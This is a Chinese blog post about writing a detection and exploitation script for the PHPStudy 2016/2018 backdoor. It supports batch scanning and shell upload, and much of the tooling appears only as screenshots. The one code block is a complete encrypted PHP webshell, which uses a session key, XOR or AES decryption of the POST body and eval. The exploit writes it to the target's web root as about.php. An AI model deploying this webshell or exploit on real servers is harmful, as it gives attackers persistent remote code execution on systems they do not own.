### PHPstudy后门漏洞POC-EXP编写

> phpstudy后门事件过去有一段时间了，漏洞也已经复现了；网上有好多检测的POC，为什么要自己写呢，因为好久没有写代码了，通过这个漏洞巩固一下code，代码国庆前写了一半，被各种事情耽搁，今天补写完整。这次写代码使用面向对象以及参数化编写，就漏洞本身来说，这种方式很麻烦，但是为了毕设的代码量练习（小声BB）。脚本支持PHPstudy2018和2016后门漏洞的检测、利用以及直接上传shell。

#### 批量检测POC

支持自定义输入目标文件

![](https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570982761.17.png)![](https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570982822.79.png)

### 漏洞利用

带参数检测、利用、传shell

phpstudy 2018

![](https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570983146.36.png)![](https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570983187.58.png)

phpstudy 2016

> 唯一有变化的就是上传shell的时候，根路径和2018不一样,路径修改如下

```php
file_put_contents('./WWW/about.php', '<?php
@error_reporting(0);
session_start();
if (isset($_GET["pass"]))
{
    $key=substr(md5(uniqid(rand())),16);
    $_SESSION["k"]=$key;
    print $key;
}
else
{
    $key=$_SESSION["k"];
	$post=file_get_contents("php://input");
	if(!extension_loaded("openssl"))
	{
		$t="base64_"."decode";
		$post=$t($post."");
		
		for($i=0;$i<strlen($post);$i++) {
    			 $post[$i] = $post[$i]^$key[$i+1&15]; 
    			}
	}
	else
	{
		$post=openssl_decrypt($post, "AES128", $key);
	}
    $arr=explode("|",$post);
    $func=$arr[0];
    $params=$arr[1];
	class C{public function __construct($p) {eval($p."");}}
	@new C($params);
}
?>');
```

![](https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570983388.91.png)

![](https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1570983409.4.png)

#### 不带参数检测、利用、传shell

> 和带参数的效果一样，就不放图了，不同的是执行命令传shell时没有解析参数时被转义的问题了

### 参考

https://yzddmr6.tk/posts/phpstudy-backdoor/

<https://github.com/NS-Sp4ce/PHPStudy_BackDoor_Exp>

### 详细文章地址

[PHPstudy后门漏洞POC-EXP编写](<http://www.lsowl.top/2019/10/14/PHPstudy%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9EPOC-EXP%E7%BC%96%E5%86%99/#more>)

